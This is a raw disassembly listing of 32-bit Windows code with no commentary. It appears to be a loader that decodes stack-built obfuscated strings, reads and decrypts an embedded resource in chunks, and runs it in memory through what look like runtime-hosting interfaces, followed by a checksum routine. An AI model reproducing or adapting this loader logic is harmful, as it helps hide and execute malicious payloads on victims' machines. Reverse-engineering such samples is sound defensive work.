  401d82:	3a 06                	cmp    (%esi),%al
  401d84:	75 1a                	jne    0x401da0
  401d86:	3a c3                	cmp    %bl,%al
  401d88:	74 12                	je     0x401d9c
  401d8a:	8a 41 01             	mov    0x1(%ecx),%al
  401d8d:	3a 46 01             	cmp    0x1(%esi),%al
  401d90:	75 0e                	jne    0x401da0
  401d92:	83 c1 02             	add    $0x2,%ecx
  401d95:	83 c6 02             	add    $0x2,%esi
  401d98:	3a c3                	cmp    %bl,%al
  401d9a:	75 e4                	jne    0x401d80
  401d9c:	33 c0                	xor    %eax,%eax
  401d9e:	eb 05                	jmp    0x401da5
  401da0:	1b c0                	sbb    %eax,%eax
  401da2:	83 d8 ff             	sbb    $0xffffffff,%eax
  401da5:	3b c3                	cmp    %ebx,%eax
  401da7:	0f 84 ef fe ff ff    	je     0x401c9c
  401dad:	8d 84 24 78 02 00 00 	lea    0x278(%esp),%eax
  401db4:	50                   	push   %eax
  401db5:	57                   	push   %edi
  401db6:	e8 c1 8f 00 00       	call   0x40ad7c
  401dbb:	85 c0                	test   %eax,%eax
  401dbd:	0f 85 4d ff ff ff    	jne    0x401d10
  401dc3:	57                   	push   %edi
  401dc4:	ff 15 38 b0 41 00    	call   *0x41b038
  401dca:	53                   	push   %ebx
  401dcb:	ff 15 30 b0 41 00    	call   *0x41b030
  401dd1:	6a 0a                	push   $0xa
  401dd3:	8d 8c 24 58 01 00 00 	lea    0x158(%esp),%ecx
  401dda:	51                   	push   %ecx
  401ddb:	8d 54 24 18          	lea    0x18(%esp),%edx
  401ddf:	52                   	push   %edx
  401de0:	8b f8                	mov    %eax,%edi
  401de2:	c6 44 24 1c fc       	movb   $0xfc,0x1c(%esp)
  401de7:	c6 44 24 1d 0b       	movb   $0xb,0x1d(%esp)
  401dec:	c6 44 24 1e ff       	movb   $0xff,0x1e(%esp)
  401df1:	c6 44 24 1f 75       	movb   $0x75,0x1f(%esp)
  401df6:	c6 44 24 20 e7       	movb   $0xe7,0x20(%esp)
  401dfb:	c6 44 24 21 44       	movb   $0x44,0x21(%esp)
  401e00:	c6 44 24 22 4b       	movb   $0x4b,0x22(%esp)
  401e05:	c6 44 24 23 23       	movb   $0x23,0x23(%esp)
  401e0a:	c6 44 24 24 bf       	movb   $0xbf,0x24(%esp)
  401e0f:	c6 44 24 25 45       	movb   $0x45,0x25(%esp)
  401e14:	c6 44 24 26 3b       	movb   $0x3b,0x26(%esp)
  401e19:	c6 44 24 27 56       	movb   $0x56,0x27(%esp)
  401e1e:	c6 44 24 28 f8       	movb   $0xf8,0x28(%esp)
  401e23:	c6 44 24 29 98       	movb   $0x98,0x29(%esp)
  401e28:	c6 44 24 2a 5b       	movb   $0x5b,0x2a(%esp)
  401e2d:	c6 44 24 2b f4       	movb   $0xf4,0x2b(%esp)
  401e32:	c6 44 24 2c b5       	movb   $0xb5,0x2c(%esp)
  401e37:	c6 44 24 2d 87       	movb   $0x87,0x2d(%esp)
  401e3c:	c6 44 24 2e 7b       	movb   $0x7b,0x2e(%esp)
  401e41:	c6 44 24 2f 0f       	movb   $0xf,0x2f(%esp)
  401e46:	c6 44 24 30 f4       	movb   $0xf4,0x30(%esp)
  401e4b:	c6 44 24 31 76       	movb   $0x76,0x31(%esp)
  401e50:	c6 44 24 32 b9       	movb   $0xb9,0x32(%esp)
  401e55:	c6 44 24 33 34       	movb   $0x34,0x33(%esp)
  401e5a:	c6 44 24 34 bf       	movb   $0xbf,0x34(%esp)
  401e5f:	c6 44 24 35 1e       	movb   $0x1e,0x35(%esp)
  401e64:	c6 44 24 36 e7       	movb   $0xe7,0x36(%esp)
  401e69:	c6 44 24 37 78       	movb   $0x78,0x37(%esp)
  401e6e:	c6 44 24 38 98       	movb   $0x98,0x38(%esp)
  401e73:	c6 44 24 39 e9       	movb   $0xe9,0x39(%esp)
  401e78:	c6 44 24 3a 6f       	movb   $0x6f,0x3a(%esp)
  401e7d:	c6 44 24 3b b4       	movb   $0xb4,0x3b(%esp)
  401e82:	88 5c 24 3c          	mov    %bl,0x3c(%esp)
  401e86:	e8 c5 f7 ff ff       	call   0x401650
  401e8b:	83 c4 08             	add    $0x8,%esp
  401e8e:	50                   	push   %eax
  401e8f:	57                   	push   %edi
  401e90:	ff 15 2c b0 41 00    	call   *0x41b02c
  401e96:	8b f0                	mov    %eax,%esi
  401e98:	56                   	push   %esi
  401e99:	57                   	push   %edi
  401e9a:	89 74 24 50          	mov    %esi,0x50(%esp)
  401e9e:	ff 15 28 b0 41 00    	call   *0x41b028
  401ea4:	8b e8                	mov    %eax,%ebp
  401ea6:	55                   	push   %ebp
  401ea7:	ff 15 24 b0 41 00    	call   *0x41b024
  401ead:	56                   	push   %esi
  401eae:	57                   	push   %edi
  401eaf:	89 44 24 44          	mov    %eax,0x44(%esp)
  401eb3:	ff 15 20 b0 41 00    	call   *0x41b020
  401eb9:	50                   	push   %eax
  401eba:	e8 8e 99 00 00       	call   0x40b84d
  401ebf:	68 22 00 04 00       	push   $0x40022
  401ec4:	8b f0                	mov    %eax,%esi
  401ec6:	e8 9b 90 00 00       	call   0x40af66
  401ecb:	83 c4 08             	add    $0x8,%esp
  401ece:	89 44 24 34          	mov    %eax,0x34(%esp)
  401ed2:	3b c3                	cmp    %ebx,%eax
  401ed4:	74 19                	je     0x401eef
  401ed6:	68 22 00 04 00       	push   $0x40022
  401edb:	53                   	push   %ebx
  401edc:	50                   	push   %eax
  401edd:	e8 4e 9b 00 00       	call   0x40ba30
  401ee2:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  401ee6:	83 c4 0c             	add    $0xc,%esp
  401ee9:	89 4c 24 50          	mov    %ecx,0x50(%esp)
  401eed:	eb 04                	jmp    0x401ef3
  401eef:	89 5c 24 50          	mov    %ebx,0x50(%esp)
  401ef3:	8b 4c 24 50          	mov    0x50(%esp),%ecx
  401ef7:	e8 04 f4 ff ff       	call   0x401300
  401efc:	8b 54 24 48          	mov    0x48(%esp),%edx
  401f00:	52                   	push   %edx
  401f01:	57                   	push   %edi
  401f02:	ff 15 20 b0 41 00    	call   *0x41b020
  401f08:	89 44 24 40          	mov    %eax,0x40(%esp)
  401f0c:	99                   	cltd
  401f0d:	81 e2 ff 03 00 00    	and    $0x3ff,%edx
  401f13:	03 c2                	add    %edx,%eax
  401f15:	c1 f8 0a             	sar    $0xa,%eax
  401f18:	3b c3                	cmp    %ebx,%eax
  401f1a:	7e 43                	jle    0x401f5f
  401f1c:	8b 54 24 3c          	mov    0x3c(%esp),%edx
  401f20:	8b ce                	mov    %esi,%ecx
  401f22:	2b ca                	sub    %edx,%ecx
  401f24:	89 54 24 34          	mov    %edx,0x34(%esp)
  401f28:	89 8c 24 88 00 00 00 	mov    %ecx,0x88(%esp)
  401f2f:	89 44 24 38          	mov    %eax,0x38(%esp)
  401f33:	8b 44 24 34          	mov    0x34(%esp),%eax
  401f37:	8b 8c 24 88 00 00 00 	mov    0x88(%esp),%ecx
  401f3e:	03 c8                	add    %eax,%ecx
  401f40:	51                   	push   %ecx
  401f41:	8b 4c 24 54          	mov    0x54(%esp),%ecx
  401f45:	68 00 04 00 00       	push   $0x400
  401f4a:	50                   	push   %eax
  401f4b:	e8 10 f6 ff ff       	call   0x401560
  401f50:	81 44 24 34 00 04 00 	addl   $0x400,0x34(%esp)
  401f57:	00 
  401f58:	83 6c 24 38 01       	subl   $0x1,0x38(%esp)
  401f5d:	75 d4                	jne    0x401f33
  401f5f:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  401f63:	81 e1 ff 03 00 80    	and    $0x800003ff,%ecx
  401f69:	79 08                	jns    0x401f73
  401f6b:	49                   	dec    %ecx
  401f6c:	81 c9 00 fc ff ff    	or     $0xfffffc00,%ecx
  401f72:	41                   	inc    %ecx
  401f73:	3b cb                	cmp    %ebx,%ecx
  401f75:	7e 1b                	jle    0x401f92
  401f77:	8b 44 24 40          	mov    0x40(%esp),%eax
  401f7b:	2b c1                	sub    %ecx,%eax
  401f7d:	8d 14 30             	lea    (%eax,%esi,1),%edx
  401f80:	52                   	push   %edx
  401f81:	51                   	push   %ecx
  401f82:	8b 4c 24 44          	mov    0x44(%esp),%ecx
  401f86:	03 c1                	add    %ecx,%eax
  401f88:	8b 4c 24 58          	mov    0x58(%esp),%ecx
  401f8c:	50                   	push   %eax
  401f8d:	e8 ce f5 ff ff       	call   0x401560
  401f92:	8b 54 24 40          	mov    0x40(%esp),%edx
  401f96:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  401f9a:	52                   	push   %edx
  401f9b:	53                   	push   %ebx
  401f9c:	50                   	push   %eax
  401f9d:	e8 8e 9a 00 00       	call   0x40ba30
  401fa2:	83 c4 0c             	add    $0xc,%esp
  401fa5:	55                   	push   %ebp
  401fa6:	ff 15 1c b0 41 00    	call   *0x41b01c
  401fac:	8b 2e                	mov    (%esi),%ebp
  401fae:	55                   	push   %ebp
  401faf:	89 ac 24 94 00 00 00 	mov    %ebp,0x94(%esp)
  401fb6:	e8 92 98 00 00       	call   0x40b84d
  401fbb:	8b 4c 24 4c          	mov    0x4c(%esp),%ecx
  401fbf:	83 c4 04             	add    $0x4,%esp
  401fc2:	51                   	push   %ecx
  401fc3:	57                   	push   %edi
  401fc4:	89 44 24 40          	mov    %eax,0x40(%esp)
  401fc8:	ff 15 20 b0 41 00    	call   *0x41b020
  401fce:	8b 7c 24 38          	mov    0x38(%esp),%edi
  401fd2:	50                   	push   %eax
  401fd3:	8d 56 04             	lea    0x4(%esi),%edx
  401fd6:	52                   	push   %edx
  401fd7:	8d 84 24 98 00 00 00 	lea    0x98(%esp),%eax
  401fde:	50                   	push   %eax
  401fdf:	57                   	push   %edi
  401fe0:	e8 7b 8c 00 00       	call   0x40ac60
  401fe5:	8b 4c 24 50          	mov    0x50(%esp),%ecx
  401fe9:	51                   	push   %ecx
  401fea:	53                   	push   %ebx
  401feb:	56                   	push   %esi
  401fec:	e8 3f 9a 00 00       	call   0x40ba30
  401ff1:	8d 94 24 10 01 00 00 	lea    0x110(%esp),%edx
  401ff8:	52                   	push   %edx
  401ff9:	8d 44 24 30          	lea    0x30(%esp),%eax
  401ffd:	50                   	push   %eax
  401ffe:	83 c7 0e             	add    $0xe,%edi
  402001:	c6 44 24 34 ce       	movb   $0xce,0x34(%esp)
  402006:	c6 44 24 35 27       	movb   $0x27,0x35(%esp)
  40200b:	c6 44 24 36 9c       	movb   $0x9c,0x36(%esp)
  402010:	c6 44 24 37 1a       	movb   $0x1a,0x37(%esp)
  402015:	c6 44 24 38 95       	movb   $0x95,0x38(%esp)
  40201a:	c6 44 24 39 21       	movb   $0x21,0x39(%esp)
  40201f:	c6 44 24 3a 2e       	movb   $0x2e,0x3a(%esp)
  402024:	c6 44 24 3b 0d       	movb   $0xd,0x3b(%esp)
  402029:	c6 44 24 3c db       	movb   $0xdb,0x3c(%esp)
  40202e:	c6 44 24 3d 29       	movb   $0x29,0x3d(%esp)
  402033:	c6 44 24 3e 57       	movb   $0x57,0x3e(%esp)
  402038:	c6 44 24 3f 56       	movb   $0x56,0x3f(%esp)
  40203d:	c6 44 24 40 f8       	movb   $0xf8,0x40(%esp)
  402042:	c6 44 24 41 98       	movb   $0x98,0x41(%esp)
  402047:	c6 44 24 42 5b       	movb   $0x5b,0x42(%esp)
  40204c:	c6 44 24 43 f4       	movb   $0xf4,0x43(%esp)
  402051:	c6 44 24 44 b5       	movb   $0xb5,0x44(%esp)
  402056:	c6 44 24 45 87       	movb   $0x87,0x45(%esp)
  40205b:	c6 44 24 46 7b       	movb   $0x7b,0x46(%esp)
  402060:	c6 44 24 47 0f       	movb   $0xf,0x47(%esp)
  402065:	c6 44 24 48 f4       	movb   $0xf4,0x48(%esp)
  40206a:	c6 44 24 49 76       	movb   $0x76,0x49(%esp)
  40206f:	c6 44 24 4a b9       	movb   $0xb9,0x4a(%esp)
  402074:	c6 44 24 4b 34       	movb   $0x34,0x4b(%esp)
  402079:	c6 44 24 4c bf       	movb   $0xbf,0x4c(%esp)
  40207e:	c6 44 24 4d 1e       	movb   $0x1e,0x4d(%esp)
  402083:	c6 44 24 4e e7       	movb   $0xe7,0x4e(%esp)
  402088:	c6 44 24 4f 78       	movb   $0x78,0x4f(%esp)
  40208d:	c6 44 24 50 98       	movb   $0x98,0x50(%esp)
  402092:	c6 44 24 51 e9       	movb   $0xe9,0x51(%esp)
  402097:	c6 44 24 52 6f       	movb   $0x6f,0x52(%esp)
  40209c:	c6 44 24 53 b4       	movb   $0xb4,0x53(%esp)
  4020a1:	88 5c 24 54          	mov    %bl,0x54(%esp)
  4020a5:	e8 a6 f5 ff ff       	call   0x401650
  4020aa:	83 c4 24             	add    $0x24,%esp
  4020ad:	50                   	push   %eax
  4020ae:	ff 15 18 b0 41 00    	call   *0x41b018
  4020b4:	8b f0                	mov    %eax,%esi
  4020b6:	c6 44 24 10 e0       	movb   $0xe0,0x10(%esp)
  4020bb:	c6 44 24 11 18       	movb   $0x18,0x11(%esp)
  4020c0:	c6 44 24 12 ad       	movb   $0xad,0x12(%esp)
  4020c5:	c6 44 24 13 36       	movb   $0x36,0x13(%esp)
  4020ca:	c6 44 24 14 95       	movb   $0x95,0x14(%esp)
  4020cf:	c6 44 24 15 21       	movb   $0x21,0x15(%esp)
  4020d4:	8d 8c 24 34 01 00 00 	lea    0x134(%esp),%ecx
  4020db:	51                   	push   %ecx
  4020dc:	8d 54 24 14          	lea    0x14(%esp),%edx
  4020e0:	52                   	push   %edx
  4020e1:	c6 44 24 1e 2a       	movb   $0x2a,0x1e(%esp)
  4020e6:	c6 44 24 1f 57       	movb   $0x57,0x1f(%esp)
  4020eb:	c6 44 24 20 da       	movb   $0xda,0x20(%esp)
  4020f0:	c6 44 24 21 0c       	movb   $0xc,0x21(%esp)
  4020f5:	c6 44 24 22 55       	movb   $0x55,0x22(%esp)
  4020fa:	c6 44 24 23 25       	movb   $0x25,0x23(%esp)
  4020ff:	c6 44 24 24 8c       	movb   $0x8c,0x24(%esp)
  402104:	c6 44 24 25 f9       	movb   $0xf9,0x25(%esp)
  402109:	c6 44 24 26 35       	movb   $0x35,0x26(%esp)
  40210e:	c6 44 24 27 97       	movb   $0x97,0x27(%esp)
  402113:	c6 44 24 28 d0       	movb   $0xd0,0x28(%esp)
  402118:	c6 44 24 29 87       	movb   $0x87,0x29(%esp)
  40211d:	c6 44 24 2a 7b       	movb   $0x7b,0x2a(%esp)
  402122:	c6 44 24 2b 0f       	movb   $0xf,0x2b(%esp)
  402127:	c6 44 24 2c f4       	movb   $0xf4,0x2c(%esp)
  40212c:	c6 44 24 2d 76       	movb   $0x76,0x2d(%esp)
  402131:	c6 44 24 2e b9       	movb   $0xb9,0x2e(%esp)
  402136:	c6 44 24 2f 34       	movb   $0x34,0x2f(%esp)
  40213b:	c6 44 24 30 bf       	movb   $0xbf,0x30(%esp)
  402140:	c6 44 24 31 1e       	movb   $0x1e,0x31(%esp)
  402145:	c6 44 24 32 e7       	movb   $0xe7,0x32(%esp)
  40214a:	c6 44 24 33 78       	movb   $0x78,0x33(%esp)
  40214f:	c6 44 24 34 98       	movb   $0x98,0x34(%esp)
  402154:	c6 44 24 35 e9       	movb   $0xe9,0x35(%esp)
  402159:	c6 44 24 36 6f       	movb   $0x6f,0x36(%esp)
  40215e:	c6 44 24 37 b4       	movb   $0xb4,0x37(%esp)
  402163:	88 5c 24 38          	mov    %bl,0x38(%esp)
  402167:	e8 e4 f4 ff ff       	call   0x401650
  40216c:	83 c4 08             	add    $0x8,%esp
  40216f:	50                   	push   %eax
  402170:	56                   	push   %esi
  402171:	ff 15 14 b0 41 00    	call   *0x41b014
  402177:	3b c3                	cmp    %ebx,%eax
  402179:	0f 95 c1             	setne  %cl
  40217c:	3a cb                	cmp    %bl,%cl
  40217e:	0f 94 44 24 47       	sete   0x47(%esp)
  402183:	a3 80 34 42 00       	mov    %eax,0x423480
  402188:	89 9c 24 80 00 00 00 	mov    %ebx,0x80(%esp)
  40218f:	89 9c 24 84 00 00 00 	mov    %ebx,0x84(%esp)
  402196:	89 5c 24 4c          	mov    %ebx,0x4c(%esp)
  40219a:	89 5c 24 58          	mov    %ebx,0x58(%esp)
  40219e:	89 5c 24 54          	mov    %ebx,0x54(%esp)
  4021a2:	3a cb                	cmp    %bl,%cl
  4021a4:	0f 84 e0 02 00 00    	je     0x40248a
  4021aa:	8d 8c 24 80 00 00 00 	lea    0x80(%esp),%ecx
  4021b1:	51                   	push   %ecx
  4021b2:	68 20 b2 41 00       	push   $0x41b220
  4021b7:	68 30 b2 41 00       	push   $0x41b230
  4021bc:	ff d0                	call   *%eax
  4021be:	85 c0                	test   %eax,%eax
  4021c0:	0f 8c a4 02 00 00    	jl     0x40246a
  4021c6:	38 5c 24 47          	cmp    %bl,0x47(%esp)
  4021ca:	0f 85 9a 02 00 00    	jne    0x40246a
  4021d0:	8b 44 24 38          	mov    0x38(%esp),%eax
  4021d4:	6a 03                	push   $0x3
  4021d6:	8d 94 24 7c 01 00 00 	lea    0x17c(%esp),%edx
  4021dd:	50                   	push   %eax
  4021de:	8d 8c 24 7c 01 00 00 	lea    0x17c(%esp),%ecx
  4021e5:	89 94 24 7c 01 00 00 	mov    %edx,0x17c(%esp)
  4021ec:	e8 ff f6 ff ff       	call   0x4018f0
  4021f1:	8b 84 24 80 00 00 00 	mov    0x80(%esp),%eax
  4021f8:	8b 08                	mov    (%eax),%ecx
  4021fa:	8d 94 24 84 00 00 00 	lea    0x84(%esp),%edx
  402201:	52                   	push   %edx
  402202:	8b 94 24 78 01 00 00 	mov    0x178(%esp),%edx
  402209:	68 40 b2 41 00       	push   $0x41b240
  40220e:	52                   	push   %edx
  40220f:	50                   	push   %eax
  402210:	8b 41 0c             	mov    0xc(%ecx),%eax
  402213:	ff d0                	call   *%eax
  402215:	85 c0                	test   %eax,%eax
  402217:	0f 8c 32 02 00 00    	jl     0x40244f
  40221d:	8b 84 24 84 00 00 00 	mov    0x84(%esp),%eax
  402224:	8b 08                	mov    (%eax),%ecx
  402226:	8d 54 24 4c          	lea    0x4c(%esp),%edx
  40222a:	52                   	push   %edx
  40222b:	68 90 b2 41 00       	push   $0x41b290
  402230:	68 10 b2 41 00       	push   $0x41b210
  402235:	50                   	push   %eax
  402236:	8b 41 24             	mov    0x24(%ecx),%eax
  402239:	ff d0                	call   *%eax
  40223b:	85 c0                	test   %eax,%eax
  40223d:	0f 8c 0c 02 00 00    	jl     0x40244f
  402243:	8b 44 24 4c          	mov    0x4c(%esp),%eax
  402247:	8b 08                	mov    (%eax),%ecx
  402249:	8b 51 28             	mov    0x28(%ecx),%edx
  40224c:	50                   	push   %eax
  40224d:	ff d2                	call   *%edx
  40224f:	85 c0                	test   %eax,%eax
  402251:	0f 8c f8 01 00 00    	jl     0x40244f
  402257:	68 88 b2 41 00       	push   $0x41b288
  40225c:	8d 4c 24 44          	lea    0x44(%esp),%ecx
  402260:	89 5c 24 38          	mov    %ebx,0x38(%esp)
  402264:	e8 07 f6 ff ff       	call   0x401870
  402269:	8b 35 6c b1 41 00    	mov    0x41b16c,%esi
  40226f:	8d 84 24 94 00 00 00 	lea    0x94(%esp),%eax
  402276:	50                   	push   %eax
  402277:	89 5c 24 40          	mov    %ebx,0x40(%esp)
  40227b:	ff d6                	call   *%esi
  40227d:	68 80 b2 41 00       	push   $0x41b280
  402282:	8d 4c 24 3c          	lea    0x3c(%esp),%ecx
  402286:	e8 e5 f5 ff ff       	call   0x401870
  40228b:	8d 8c 24 a4 00 00 00 	lea    0xa4(%esp),%ecx
  402292:	51                   	push   %ecx
  402293:	ff d6                	call   *%esi
  402295:	8b 54 24 4c          	mov    0x4c(%esp),%edx
  402299:	8b 32                	mov    (%edx),%esi
  40229b:	8d 4c 24 58          	lea    0x58(%esp),%ecx
  40229f:	83 c6 34             	add    $0x34,%esi
  4022a2:	e8 29 f6 ff ff       	call   0x4018d0
  4022a7:	8b 0e                	mov    (%esi),%ecx
  4022a9:	50                   	push   %eax
  4022aa:	8b 44 24 50          	mov    0x50(%esp),%eax
  4022ae:	50                   	push   %eax
  4022af:	ff d1                	call   *%ecx
  4022b1:	8b 74 24 58          	mov    0x58(%esp),%esi
  4022b5:	3b f3                	cmp    %ebx,%esi
  4022b7:	75 0a                	jne    0x4022c3
  4022b9:	68 03 40 00 80       	push   $0x80004003
  4022be:	e8 cd 8a 00 00       	call   0x40ad90
  4022c3:	8d 4c 24 54          	lea    0x54(%esp),%ecx
  4022c7:	e8 04 f6 ff ff       	call   0x4018d0
  4022cc:	8b 16                	mov    (%esi),%edx
  4022ce:	50                   	push   %eax
  4022cf:	8b 02                	mov    (%edx),%eax
  4022d1:	68 70 b2 41 00       	push   $0x41b270
  4022d6:	56                   	push   %esi
  4022d7:	ff d0                	call   *%eax
  4022d9:	8d 8c 24 88 00 00 00 	lea    0x88(%esp),%ecx
  4022e0:	51                   	push   %ecx
  4022e1:	6a 01                	push   $0x1
  4022e3:	83 c5 f2             	add    $0xfffffff2,%ebp
  4022e6:	6a 11                	push   $0x11
  4022e8:	89 ac 24 94 00 00 00 	mov    %ebp,0x94(%esp)
  4022ef:	89 9c 24 98 00 00 00 	mov    %ebx,0x98(%esp)
  4022f6:	ff 15 54 b1 41 00    	call   *0x41b154
  4022fc:	8d 54 24 48          	lea    0x48(%esp),%edx
  402300:	8b f0                	mov    %eax,%esi
  402302:	52                   	push   %edx
  402303:	56                   	push   %esi
  402304:	89 5c 24 50          	mov    %ebx,0x50(%esp)
  402308:	ff 15 58 b1 41 00    	call   *0x41b158
  40230e:	8b 44 24 48          	mov    0x48(%esp),%eax
  402312:	55                   	push   %ebp
  402313:	57                   	push   %edi
  402314:	50                   	push   %eax
  402315:	e8 36 90 00 00       	call   0x40b350
  40231a:	83 c4 0c             	add    $0xc,%esp
  40231d:	56                   	push   %esi
  40231e:	ff 15 5c b1 41 00    	call   *0x41b15c
  402324:	8b 44 24 54          	mov    0x54(%esp),%eax
  402328:	3b c3                	cmp    %ebx,%eax
  40232a:	75 0a                	jne    0x402336
  40232c:	68 03 40 00 80       	push   $0x80004003
  402331:	e8 5a 8a 00 00       	call   0x40ad90
  402336:	8b 38                	mov    (%eax),%edi
  402338:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  40233c:	8b e8                	mov    %eax,%ebp
  40233e:	81 c7 b4 00 00 00    	add    $0xb4,%edi
  402344:	e8 87 f5 ff ff       	call   0x4018d0
  402349:	8b 0f                	mov    (%edi),%ecx
  40234b:	50                   	push   %eax
  40234c:	56                   	push   %esi
  40234d:	55                   	push   %ebp
  40234e:	ff d1                	call   *%ecx
  402350:	3b f3                	cmp    %ebx,%esi
  402352:	74 07                	je     0x40235b
  402354:	56                   	push   %esi
  402355:	ff 15 60 b1 41 00    	call   *0x41b160
  40235b:	8b 44 24 34          	mov    0x34(%esp),%eax
  40235f:	3b c3                	cmp    %ebx,%eax
  402361:	75 0a                	jne    0x40236d
  402363:	68 03 40 00 80       	push   $0x80004003
  402368:	e8 23 8a 00 00       	call   0x40ad90
  40236d:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  402371:	8b e8                	mov    %eax,%ebp
  402373:	3b cb                	cmp    %ebx,%ecx
  402375:	74 04                	je     0x40237b
  402377:	8b 39                	mov    (%ecx),%edi
  402379:	eb 02                	jmp    0x40237d
  40237b:	33 ff                	xor    %edi,%edi
  40237d:	8b 30                	mov    (%eax),%esi
  40237f:	8d 4c 24 3c          	lea    0x3c(%esp),%ecx
  402383:	83 c6 44             	add    $0x44,%esi
  402386:	e8 45 f5 ff ff       	call   0x4018d0
  40238b:	8b 16                	mov    (%esi),%edx
  40238d:	50                   	push   %eax
  40238e:	57                   	push   %edi
  40238f:	55                   	push   %ebp
  402390:	ff d2                	call   *%edx
  402392:	53                   	push   %ebx
  402393:	53                   	push   %ebx
  402394:	6a 0c                	push   $0xc
  402396:	ff 15 64 b1 41 00    	call   *0x41b164
  40239c:	8b 4c 24 3c          	mov    0x3c(%esp),%ecx
  4023a0:	3b cb                	cmp    %ebx,%ecx
  4023a2:	75 0a                	jne    0x4023ae
  4023a4:	68 03 40 00 80       	push   $0x80004003
  4023a9:	e8 e2 89 00 00       	call   0x40ad90
  4023ae:	8b 44 24 38          	mov    0x38(%esp),%eax
  4023b2:	3b c3                	cmp    %ebx,%eax
  4023b4:	74 04                	je     0x4023ba
  4023b6:	8b 10                	mov    (%eax),%edx
  4023b8:	eb 02                	jmp    0x4023bc
  4023ba:	33 d2                	xor    %edx,%edx
  4023bc:	8b bc 24 94 00 00 00 	mov    0x94(%esp),%edi
  4023c3:	8b 31                	mov    (%ecx),%esi
  4023c5:	8d 84 24 a4 00 00 00 	lea    0xa4(%esp),%eax
  4023cc:	50                   	push   %eax
  4023cd:	53                   	push   %ebx
  4023ce:	83 ec 10             	sub    $0x10,%esp
  4023d1:	8b c4                	mov    %esp,%eax
  4023d3:	89 38                	mov    %edi,(%eax)
  4023d5:	8b bc 24 b0 00 00 00 	mov    0xb0(%esp),%edi
  4023dc:	53                   	push   %ebx
  4023dd:	89 78 04             	mov    %edi,0x4(%eax)
  4023e0:	8b bc 24 b8 00 00 00 	mov    0xb8(%esp),%edi
  4023e7:	68 18 01 00 00       	push   $0x118
  4023ec:	89 78 08             	mov    %edi,0x8(%eax)
  4023ef:	8b bc 24 c0 00 00 00 	mov    0xc0(%esp),%edi
  4023f6:	52                   	push   %edx
  4023f7:	51                   	push   %ecx
  4023f8:	8b 8e e4 00 00 00    	mov    0xe4(%esi),%ecx
  4023fe:	89 78 0c             	mov    %edi,0xc(%eax)
  402401:	ff d1                	call   *%ecx
  402403:	8b 35 68 b1 41 00    	mov    0x41b168,%esi
  402409:	8d 94 24 a4 00 00 00 	lea    0xa4(%esp),%edx
  402410:	52                   	push   %edx
  402411:	ff d6                	call   *%esi
  402413:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  402417:	e8 84 f5 ff ff       	call   0x4019a0
  40241c:	8d 84 24 94 00 00 00 	lea    0x94(%esp),%eax
  402423:	50                   	push   %eax
  402424:	ff d6                	call   *%esi
  402426:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  40242a:	3b c3                	cmp    %ebx,%eax
  40242c:	74 08                	je     0x402436
  40242e:	8b 08                	mov    (%eax),%ecx
  402430:	8b 51 08             	mov    0x8(%ecx),%edx
  402433:	50                   	push   %eax
  402434:	ff d2                	call   *%edx
  402436:	8d 4c 24 40          	lea    0x40(%esp),%ecx
  40243a:	e8 61 f5 ff ff       	call   0x4019a0
  40243f:	8b 44 24 34          	mov    0x34(%esp),%eax
  402443:	3b c3                	cmp    %ebx,%eax
  402445:	74 08                	je     0x40244f
  402447:	8b 08                	mov    (%eax),%ecx
  402449:	8b 51 08             	mov    0x8(%ecx),%edx
  40244c:	50                   	push   %eax
  40244d:	ff d2                	call   *%edx
  40244f:	8b 84 24 74 01 00 00 	mov    0x174(%esp),%eax
  402456:	8d 8c 24 78 01 00 00 	lea    0x178(%esp),%ecx
  40245d:	3b c1                	cmp    %ecx,%eax
  40245f:	74 09                	je     0x40246a
  402461:	50                   	push   %eax
  402462:	e8 4e 92 00 00       	call   0x40b6b5
  402467:	83 c4 04             	add    $0x4,%esp
  40246a:	8b 44 24 54          	mov    0x54(%esp),%eax
  40246e:	3b c3                	cmp    %ebx,%eax
  402470:	74 08                	je     0x40247a
  402472:	8b 10                	mov    (%eax),%edx
  402474:	50                   	push   %eax
  402475:	8b 42 08             	mov    0x8(%edx),%eax
  402478:	ff d0                	call   *%eax
  40247a:	8b 44 24 58          	mov    0x58(%esp),%eax
  40247e:	3b c3                	cmp    %ebx,%eax
  402480:	74 08                	je     0x40248a
  402482:	8b 08                	mov    (%eax),%ecx
  402484:	8b 51 08             	mov    0x8(%ecx),%edx
  402487:	50                   	push   %eax
  402488:	ff d2                	call   *%edx
  40248a:	5f                   	pop    %edi
  40248b:	5e                   	pop    %esi
  40248c:	5d                   	pop    %ebp
  40248d:	33 c0                	xor    %eax,%eax
  40248f:	5b                   	pop    %ebx
  402490:	81 c4 8c 04 00 00    	add    $0x48c,%esp
  402496:	c3                   	ret
  402497:	cc                   	int3
  402498:	cc                   	int3
  402499:	cc                   	int3
  40249a:	cc                   	int3
  40249b:	cc                   	int3
  40249c:	cc                   	int3
  40249d:	cc                   	int3
  40249e:	cc                   	int3
  40249f:	cc                   	int3
  4024a0:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4024a4:	53                   	push   %ebx
  4024a5:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  4024a9:	57                   	push   %edi
  4024aa:	8b f9                	mov    %ecx,%edi
  4024ac:	c1 ef 10             	shr    $0x10,%edi
  4024af:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  4024b5:	83 fb 01             	cmp    $0x1,%ebx
  4024b8:	75 31                	jne    0x4024eb
  4024ba:	8b 44 24 10          	mov    0x10(%esp),%eax
  4024be:	0f b6 10             	movzbl (%eax),%edx
  4024c1:	03 ca                	add    %edx,%ecx
  4024c3:	81 f9 f1 ff 00 00    	cmp    $0xfff1,%ecx
  4024c9:	72 06                	jb     0x4024d1
  4024cb:	81 e9 f1 ff 00 00    	sub    $0xfff1,%ecx
  4024d1:	03 f9                	add    %ecx,%edi
  4024d3:	81 ff f1 ff 00 00    	cmp    $0xfff1,%edi
  4024d9:	72 06                	jb     0x4024e1
  4024db:	81 ef f1 ff 00 00    	sub    $0xfff1,%edi
  4024e1:	8b c7                	mov    %edi,%eax
  4024e3:	c1 e0 10             	shl    $0x10,%eax
  4024e6:	5f                   	pop    %edi
  4024e7:	0b c1                	or     %ecx,%eax
  4024e9:	5b                   	pop    %ebx
  4024ea:	c3                   	ret
  4024eb:	56                   	push   %esi
